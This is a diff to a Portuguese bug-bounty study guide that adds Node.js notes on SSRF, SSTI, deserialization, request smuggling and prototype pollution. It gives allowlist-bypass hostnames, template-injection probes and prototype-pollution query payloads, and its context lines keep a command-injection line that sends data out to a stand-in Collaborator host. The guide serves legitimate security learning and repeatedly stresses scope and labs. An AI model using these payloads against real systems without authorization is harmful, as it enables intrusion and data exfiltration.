@@ -72,6 +72,8 @@ Content-Type: application/json
 
 **Variações/avançado:** SSRF cega (use Collaborator), bypass de filtro (IP decimal `2130706433`, IPv6 `[::1]`, redirect 302 para interno, DNS rebinding), SSRF → RCE via gopher para Redis/serviços internos, metadados AWS/GCP/Azure (IMDSv1).
 
+> 🧭 **Ângulo Node** ([lente Orange Tsai 2.1](orange-tsai-decodificado-js.md#21-ssrf-avançado--node-undici-fetch-axios-e-a-inconsistência-parserrequester)): o diferencial **parser vs requester** é nativo. Uma allowlist escrita com `new URL()` (WHATWG) e um `fetch`/`undici`/`axios` que segue **302** para interno = SSRF (TOCTOU). Allowlists por string (`host.endsWith(".alvo.com")`, `url.includes("alvo.com")`) caem com `alvo.com.evil.com`, `alvo.com@evil.com`, `evil.com/alvo.com`. `follow-redirects` já teve falhas de vazamento de header em redirect cross-host. Em **serverless/edge**, o IMDS some, mas surgem metadata do provider e **env com segredos** — SSRF vira leak de env.
+
 **Automação:** parâmetros via `gf ssrf`; injetar URL de Collaborator em massa com `qsreplace` e monitorar callbacks.
 
 ---
@@ -136,6 +138,15 @@ $(curl http://SEU-COLLABORATOR)        # exfil blind via OOB
 
 **Variações/avançado:** distinguir SSTI de XSS (avaliação no servidor vs cliente), polyglots para fingerprint de engine, sandbox escapes específicos por engine.
 
+> 🧭 **Engines JS (o pivô).** Menos comum que em Python, mas quando existe é RCE direto — e é um **sink perfeito para gadget de [prototype pollution](#b2-prototype-pollution)**. Fingerprint e escalonamento por engine:
+> - **Pug** (ex-Jade): `#{7*7}` avalia; interpolação de código → RCE via `process`/`require` no contexto do template.
+> - **EJS**: `<%= 7*7 %>`; opções como `outputFunctionName`/`escapeFunction`/`settings` são vetor clássico (inclusive via prototype pollution) → RCE.
+> - **Handlebars**: não avalia JS por padrão, mas cadeias de `constructor`/helpers conhecidas levam a RCE (pesquisa pública de gadget chains).
+> - **Nunjucks**: `{{7*7}}`; ambiente com autoescape off + acesso a `range`/`cycler`/globals → RCE.
+> - **Detecção:** injete `{{7*7}}`, `#{7*7}`, `<%= 7*7 %>` e veja qual retorna `49`; isso já revela o engine.
+
+**Onde treinar / caçar:** labs de SSTI da PortSwigger + challenges de CTF web JS → no bounty: e-mails/páginas geradas, mensagens customizadas, qualquer input renderizado por template server-side em app Node.
+
 **Automação:** [tplmap](https://github.com/epinna/tplmap) para confirmação (use com cautela e em escopo).
 
 ---
@@ -155,6 +166,11 @@ O:8:"Exemplo":1:{s:3:"cmd";s:7:"id;uname";}
 ```
 
 **Variações/avançado:** ysoserial (Java) e phpggc (PHP) para gadget chains, .NET ViewState, Python pickle RCE, Ruby Marshal. PoC sempre **local/lab**; em prod, impacto mínimo.
+
+> 🧭 **No mundo JS** ([lente Orange Tsai 2.6](orange-tsai-decodificado-js.md#26-desserialização-e-execução--node-serialize-vm2-prototype-pollution)):
+> - **`node-serialize` (CVE-2017-5941):** `unserialize()` reconstrói funções marcadas com `_$$ND_FUNC$$_`; um **IIFE** embutido executa na desserialização → RCE. `funcster` tem risco análogo.
+> - **`vm`/`vm2` sandbox escape:** o `vm` do Node **não é** sandbox de segurança; o `vm2` foi **descontinuado (jul/2023)** após escapes irrecuperáveis (**CVE-2023-37466**, **CVE-2023-37903**, CVSS 9.8 → RCE). Procure `vm2` no `package-lock.json` de apps que rodam "fórmula/expressão/plugin do usuário". Migração: `isolated-vm`.
+> - **A ponte com [prototype pollution](#b2-prototype-pollution):** muitos RCEs em Node não vêm de "desserialização" clássica, e sim de **PP → gadget** que termina num sink de execução — a mesma família.
 
 **Automação:** detecção de blobs serializados no recon; nuclei para padrões conhecidos (ViewState etc.).
 
@@ -180,6 +196,8 @@ G   <- "G" fica no buffer e prefixa a próxima request da vítima
 ```
 
 **Variações/avançado:** H2.CL / H2.TE desync, request tunnelling, cache poisoning via smuggling, [research do James Kettle](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn). É avançado — domine depois das classes base.
+
+> 🧭 **Node por trás do proxy** ([lente Orange Tsai 2.3](orange-tsai-decodificado-js.md#23-http-request-smuggling--desync--llhttp-e-o-node-por-trás-do-proxy)): o parser HTTP do Node é o **`llhttp`**. Desync surge quando o front (CDN/nginx/HAProxy) e o `llhttp` discordam do fim da mensagem (tolerâncias de `chunked`/whitespace) ou na tradução **HTTP/2→HTTP/1**. Sinal de escopo: **muito delicado** — a PoC pode afetar outros usuários; confirme por timing e domine em lab antes de tocar produção.
 
 **Automação:** HTTP Request Smuggler (Burp) automatiza a detecção; a confirmação e a exploração são manuais e delicadas (risco de afetar outros usuários — cuidado com escopo).
 
@@ -276,7 +294,15 @@ Object.prototype.polluted = true; ({}).polluted   // true => poluível
 
 **Variações/avançado:** server-side prototype pollution (SSPP) → RCE em Node, gadgets em templates/parsers, [pesquisa de Gareth Heyes / PortSwigger](https://portswigger.net/research/server-side-prototype-pollution).
 
-**Automação:** [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader) detecta prototype pollution client-side automaticamente.
+> 🧭 **A classe-assinatura do ecossistema JS** ([lente Orange Tsai 2.6](orange-tsai-decodificado-js.md#26-desserialização-e-execução--node-serialize-vm2-prototype-pollution)). Vale dominar a fundo:
+> - **Fontes de poluição** (por onde entra): deep-merge de body/config (`_.merge`/`_.defaultsDeep` antigos, merges recursivos caseiros), parsing de query com `qs` (`?__proto__[x]=y`, `?constructor[prototype][x]=y`), `Object.assign` profundo, `JSON.parse` + merge. Chaves-veneno: `__proto__`, `constructor.prototype`.
+> - **Client-side → DOM XSS:** ache um **gadget** — uma propriedade poluível que um sink lê (config de sanitizer, `srcdoc`, `src`, template do framework). Poluir `Object.prototype` muda o *default* que o código assume.
+> - **Server-side (SSPP) → RCE:** *Silent Spring* (USENIX Security 2023 / DEF CON 31, KTH) mapeou **11 gadgets universais** em APIs core do Node (opções default que acabam em `child_process.spawn`/`require`/template) → RCE em NPM CLI, Parse Server, Rocket.Chat. Detecção **black-box sem DoS** (Heyes): polua uma prop que muda a resposta observável (status/JSON/header) sem derrubar o serviço.
+> - **Bypass/EoP:** poluir `isAdmin`/`role`/flags de config que outro trecho lê como default.
+
+**Onde treinar / caçar:** labs de prototype pollution da [PortSwigger](https://portswigger.net/web-security/prototype-pollution) e challenges de CTF (é quase um gênero próprio) → no bounty: endpoints que fazem deep-merge do body, apps com lodash desatualizado, config JSON. Gadgets prontos: [KTH-LangSec/server-side-prototype-pollution](https://github.com/KTH-LangSec/server-side-prototype-pollution).
+
+**Automação:** [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader) detecta prototype pollution client-side automaticamente; server-side é semi-manual (técnica black-box do Heyes).
 
 ---
 
